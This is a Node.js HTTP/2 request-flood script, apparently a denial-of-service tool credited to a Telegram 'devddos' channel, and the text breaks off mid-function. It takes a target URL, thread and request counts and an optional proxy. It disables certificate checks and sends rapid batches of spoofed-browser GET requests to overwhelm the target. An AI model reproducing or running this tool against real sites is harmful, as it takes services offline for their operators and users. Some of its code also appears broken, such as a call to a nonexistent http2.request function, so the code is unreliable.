//by https://t.me/devddos
// Import required modules
const http2 = require('http2');
const https = require('https');
const url = require('url');
const fs = require('fs');
const { Worker } = require('worker_threads');

// Parse arguments
const args = process.argv.slice(2);
const targetUrl = args[0];
const numThreads = parseInt(args[1]);
const numRequests = parseInt(args[2]);
const headers = {
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
  'Accept-Encoding': 'gzip, deflate',
  'Accept-Language': 'en-US,en;q=0.9',
  'Connection': 'keep-alive',
};
const proxyUrl = args[3];

// Create options object for http2/https request
const target = url.parse(targetUrl);
const options = {
  protocol: target.protocol,
  hostname: target.hostname,
  path: target.path,
  method: 'GET',
  headers: headers,
  rejectUnauthorized: false,
};

// Create http2 client session
let session;
if (target.protocol === 'https:') {
  const agent = new https.Agent({
    keepAlive: true,
    maxSockets: Infinity,
    rejectUnauthorized: false,
  });
  options.agent = agent;
  session = http2.connect(targetUrl, { agent });
} else {
  session = http2.connect(targetUrl);
}

// Create worker function for making requests
function requestWorker() {
  return new Promise((resolve, reject) => {
    const request = session.request(options);
    request.on('response', (headers, flags) => {
      const stream = request;
      stream.on('end', () => {
        resolve();
      });
      stream.on('error', (err) => {
        reject(err);
      });
    });
    request.end();
  });
}

// Create function to handle proxy requests
function proxyRequestWorker() {
  return new Promise((resolve, reject) => {
    const proxy = url.parse(proxyUrl);
    options.path = targetUrl;
    options.hostname = proxy.hostname;
    options.port = proxy.port;
    options.protocol = proxy.protocol;
    const request = http2.request(options);
    request.on('response', (headers, flags) => {
      const stream = request;
      stream.on('end', () => {
        resolve();
      });
      stream.on('error', (err) => {
        reject(err);
      });
    });
    request.end();
  });
}

// Function to run requests
async function runRequests(worker) {
  try {
    await worker();
  } catch (err) {
    console.log('Request error:', err);
  }
}

// Start workers
let workers = [];
for (let i = 0; i < numThreads; i++) {
  if (proxyUrl) {
    workers.push(proxyRequestWorker);
  } else {
    workers.push(requestWorker);
  }
}

// Run workers
async function startWorkers() {
  let numCompletedRequests = 0;
  let startTime = Date.now();
  while (numCompletedRequests < numRequests) {
    for (let i = 0; i < numThreads; i++) {
      runRequests(workers[i]).then(() => {
        numCompletedRequests++;
      });
    }
    // Wait for a short period of time between each batch of requests
    await new Promise((resolve) => setTimeout(resolve, 10));
  }